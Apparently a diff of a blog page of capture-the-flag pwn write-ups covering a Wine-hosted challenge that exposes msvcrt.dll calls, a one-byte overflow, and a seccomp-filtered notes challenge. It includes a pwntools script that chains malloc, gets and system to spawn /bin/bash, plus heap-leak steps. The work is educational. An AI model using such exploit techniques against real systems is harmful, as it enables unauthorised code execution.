+</code></pre><p>The most important thing is that we are in the <code>__GI___libc_read</code> function, as we would expect in a regular Linux process that waits for some input.</p>
 <p>If you restart the process and look at it again, you will see that the all libraries are mapped to different addresses each time, while the addresses of the <code>msvcrt.dll</code> libraries mostly remain the same.</p>
 <p>It&rsquo;s called the LoadLibrary function and passes the <code>msvcrt.dll</code> as an argument to get the base of the <code>msvcrt.dll</code> module.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    HMODULE msvcrt <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;msvcrt.dll&#34;</span>);
@@ -1356,55 +1369,55 @@ http {
 <ol>
 <li>I call the malloc function of msvcrt.dll with an appropriate size as an argument to allocate memory and obtain the address.</li>
 <li>I call the gets function of msvcrt.dll with the address in step 1 as an argument, then enter the command <code>/bin/bash</code> =))</li>
-<li>Call &lsquo;WinExec&rsquo; and pass the address of the string as an argument, and we get a shell.</li>
+<li>Call <code>WinExec</code> and pass the address of the string as an argument, and we get a shell.</li>
 </ol>
 <p><img src="https://imgur.com/QNOdSBQ.png" alt="image"></p>
 <p>I founded that <code>/root/.wine/dosdevices/z:</code> is just a symlink to <code>/</code></p>
 <p><img src="https://imgur.com/JAQqaBa.png" alt="image"></p>
-<p>Since the original <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a> function is a function that takes two arguments, it seems that an indefinite value will be entered in the second argument uCmdShow in this execution method. However, it may be that the uCmdShow argument is a value that does not affect CUI programs.</p>
+<p>Since the original <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a> function is a function that takes two arguments, it seems that an indefinite value will be entered in the second argument uCmdShow in this execution method. However, it may be that the uCmdShow argument is a value that does not affect programs.</p>
 <p><img src="https://imgur.com/GAKJAea.png" alt="image"></p>
 <h3 id="method-2">Method 2</h3>
-<p>In this way, I do the same as above, but instead of calling the WinExec function, I call the system function of the module msvcrt.dll</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
-</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
-</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
-</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
-</span></span><span style="display:flex;"><span>print(out)
-</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
-</span></span><span style="display:flex;"><span>print(hex(heap_addr))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><p>But when running, it failed and returned -1, I don&rsquo;t know why it happened.</p>
+<p>In this way, I do the same as above, but instead of calling the WinExec function, I call <code>system</code> function of the module msvcrt.dll</p>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">from pwn import *
+
+HOST = &#34;0&#34;
+PORT = 1337
+if args.LOCAL:
+    io = process([&#34;wine&#34;, &#34;challenge.exe&#34;])
+else:
+    io = remote(HOST, int(PORT))
+    
+io.sendline(b&#39;msvcrt.dll&#39;)
+io.sendline(b&#39;malloc&#39;)
+io.sendline(str(0x100).encode()) 
+
+io.recvuntil(b&#39;Result: &#39;)
+out = io.recvuntil(b&#39;\r\n&#39;).strip()
+print(out)
+heap_addr = int(out.split(b&#39;: &#39;)[-1],16)
+print(hex(heap_addr))
+
+io.sendline(b&#39;msvcrt.dll&#39;)
+io.sendline(b&#39;gets&#39;)
+io.sendline(str(heap_addr).encode())
+io.sendline(b&#39;/bin/bash&#39;)
+
+io.sendline(b&#39;msvcrt.dll&#39;)
+io.sendline(b&#39;puts&#39;)
+io.sendline(str(heap_addr).encode())
+
+io.sendline(b&#39;msvcrt.dll&#39;)
+io.sendline(b&#39;system&#39;)
+
+io.sendline(str(heap_addr).encode())
+
+io.interactive()
+</code></pre><p>But when running, it failed and returned -1, I don&rsquo;t know why it happened.</p>
 <p>According to Microsoft&rsquo;s system function documentation, if calling the system function results in an error, it returns -1 and sets the error code to the global variable <code>errno</code>.</p>
 <blockquote>
 <p>If command is NULL and the command interpreter is found, returns a nonzero value. If the command interpreter isn&rsquo;t found, returns 0 and sets errno to ENOENT. If command isn&rsquo;t NULL, system returns the value that is returned by the command interpreter. It returns the value 0 only if the command interpreter returns the value 0. A return value of -1 indicates an error, and errno is set to one of the following values.</p>
 </blockquote>
-<p>So I leveraged the <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170">_get_errno</a> function to to get the current value of the errno global variable.</p>
+<p>So I used the <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170">_get_errno</a> function to to get the current value of the errno global variable.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
@@ -1643,7 +1656,7 @@ http {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The only bug I found in this challenge is the one-byte overflow to the next struct because it allows us to have solution string up to 10 characters long</p>
+</span></span></code></pre></div><p>The only bug I found in this challenge is the one-byte overflow to the next struct because it allows us to have solution string up to 10 characters long but actually only 9 chars.</p>
 <p>So, I used this bug to leak and did a basic buffer overflow.</p>
 <h2 id="solve-script-3">Solve script</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -1705,8 +1718,42 @@ http {
 </span></span><span style="display:flex;"><span>├── run_on_socket.sh
 </span></span><span style="display:flex;"><span>├── seccomp.txt
 </span></span><span style="display:flex;"><span>└── start.sh
-</span></span></code></pre></div><p>This challenge looks like the typical notes challenge,  but there is a strong seccomp filter.</p>
-<p>It begins with installing some crash handlers and also opens the flag file. So, if we can control the flow, we can easily read the flag file.</p>
+</span></span></code></pre></div><p>This challenge looks like the typical notes challenge, and there is a seccomp filter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(rt_sigreturn),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(read),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(write),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(close),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(lseek),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mmap),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(msync),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mprotect),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(memfd_create),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mremap),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(munmap),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(readv),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(writev),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(pipe),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(select),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(dup),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(dup2),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(nanosleep),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(alarm),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(getpid),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(gettid),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(sendfile),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(fork),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(clone),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(exit),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mkdir),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(brk),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(clock_nanosleep),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mkdirat),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(exit_group),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(newfstatat),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(rt_sigprocmask),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(getrandom),
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(tgkill),
+</span></span></code></pre></div><p>It begins with installing some crash handlers and also opens the flag file. So, if we can control the flow, we can easily read the flag file.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
@@ -1767,7 +1814,7 @@ http {
 </span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> m;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>  }
-</span></span></code></pre></div><p>Since the value doesn&rsquo;t overwrite when they are NaN and because after malloc, the memory isn&rsquo;t properly initialized. So we can leverage that to have a leak through the <code>draw_graph</code> function.</p>
+</span></span></code></pre></div><p>Since the value doesn&rsquo;t overwrite when they are NaN and because after malloc, the memory isn&rsquo;t properly initialized. So we can leverage this to leak through <code>draw_graph</code> function.</p>
 <h2 id="trigger-the-bug">Trigger the bug</h2>
 <p>First, I created 2 chunks of 0x400 size, then free 1 to make it into the unsorted bin</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; bins
